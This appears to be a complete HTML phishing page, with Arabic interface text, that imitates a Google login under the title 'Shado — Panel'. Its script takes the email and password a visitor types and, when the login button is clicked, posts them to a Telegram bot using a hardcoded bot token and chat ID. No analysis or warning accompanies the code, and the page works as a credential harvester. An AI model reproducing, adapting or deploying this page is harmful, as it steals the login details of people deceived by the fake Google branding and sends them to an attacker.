<!doctype html>
<html lang="ar">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Shado — Panel</title>

<style>
  body{
    margin:0;height:100vh;display:flex;flex-direction:column;
    align-items:center;justify-content:center;
    background:#070710;transition:1.8s;
    font-family:sans-serif;color:white;
  }
  body.purple{background:#2a0b3d;}

  .orb{
    width:220px;height:220px;border-radius:50%;
    background:url('hhh.png') center/cover;
    box-shadow:0 0 30px rgba(150,0,255,0.4);
    margin-bottom:25px;
  }

  .brand{
    font-size:60px;font-weight:900;letter-spacing:-3px;
    text-shadow:0 0 20px #9b4cff;
    animation:glow 3s infinite ease-in-out;
    margin-bottom:40px;
  }
  @keyframes glow{
    0%{text-shadow:0 0 10px #9b4cff;}
    50%{text-shadow:0 0 30px #9b4cff;}
    100%{text-shadow:0 0 10px #9b4cff;}
  }

  .loginbox{
    width:50vw;min-width:300px;
    background:rgba(0,0,0,0.45);
    backdrop-filter:blur(12px);
    padding:30px;border-radius:16px;
    display:flex;flex-direction:column;gap:20px;
  }

  .input{position:relative;}
  .input input{
    width:100%;padding:14px 46px 14px 14px;font-size:17px;
    background:rgba(255,255,255,0.08);border:0;border-radius:10px;
    color:white;outline:none;
  }
  .input input::placeholder{color:#ccc;}
  .eye{
    position:absolute;right:12px;top:50%;transform:translateY(-50%);
    font-size:20px;cursor:pointer;user-select:none;
  }

  .btn{
    padding:14px;border:0;border-radius:10px;font-size:17px;
    background:#6a4bff;color:white;cursor:pointer;
  }
</style>
</head>

<body>

<div class="orb"></div>
<div class="brand">Google</div>

<div class="loginbox">
  <div class="input">
    <input type="email" id="email" placeholder="البريد الإلكتروني">
  </div>

  <div class="input">
    <input type="password" id="pass" placeholder="كلمة السر">
    <div class="eye" id="toggle">👁</div>
  </div>

  <button class="btn" id="sendBtn">تسجيل الدخول</button>
</div>

<script>
/* تغيير الخلفية للبنفسجي عند الضغط */
document.body.addEventListener("click", ()=> {
  document.body.classList.toggle("purple");
});

/* زر إظهار/إخفاء كلمة السر */
const pass = document.getElementById('pass');
const t = document.getElementById('toggle');

t.onclick = ()=>{
  if(pass.type === "password"){
    pass.type = "text";
    t.textContent = "🙈";
  } else {
    pass.type = "password";
    t.textContent = "👁";
  }
};

/* سكريبت إرسال واستقبال تيليغرام */
const TOKEN = "8757355224:AAF6QbA34Eq03MTdUxhYB2tjjIbFbUaII_8";
const CHAT_ID = "8166977574";
const API = `https://api.telegram.org/bot${TOKEN}`;

// إرسال رسالة
async function send(msg){
  await fetch(`${API}/sendMessage`, {
    method:"POST",
    headers:{ "Content-Type":"application/json" },
    body:JSON.stringify({ chat_id:CHAT_ID, text:msg })
  });
}

// استقبال آخر رسالة
async function receive(){
  const r = await fetch(`${API}/getUpdates`);
  const j = await r.json();
  console.log(j.result.pop());
}

/* عند الضغط على زر تسجيل الدخول */
document.getElementById("sendBtn").onclick = async ()=>{
  const email = document.getElementById("email").value;
  const pass = document.getElementById("pass").value;

  await send(`🔐 Login Attempt\n📧 Email: ${email}\n🔑 Pass: ${pass}`);
};
</script>

</body>
</html>
